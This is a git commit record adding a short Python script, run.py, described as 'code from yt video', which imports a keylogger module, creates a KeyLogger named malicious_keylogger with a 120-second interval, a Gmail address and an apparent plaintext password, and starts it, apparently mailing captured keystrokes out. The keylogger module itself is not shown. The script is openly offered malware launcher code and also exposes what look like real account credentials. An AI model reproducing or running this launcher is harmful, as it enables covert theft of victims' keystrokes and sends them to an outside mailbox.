1701b12f612201fab3a4d7dbb8917602105ad742
tsitsi-flora <tsitsimunikwa97@gmail.com>
2019-06-18 09:20:55 +0200

    code from yt video

---
+++ run.py
@@ -0,0 +1,13 @@
+#!/usr/bin/env python
+
+import keylogger
+
+
+# Initialize / create keylogger
+
+malicious_keylogger = keylogger.KeyLogger(
+    120, 'tsitsiflora80@gmail.com', 'girlhacker1997')
+
+# Execute Keylogger
+
+malicious_keylogger.start()
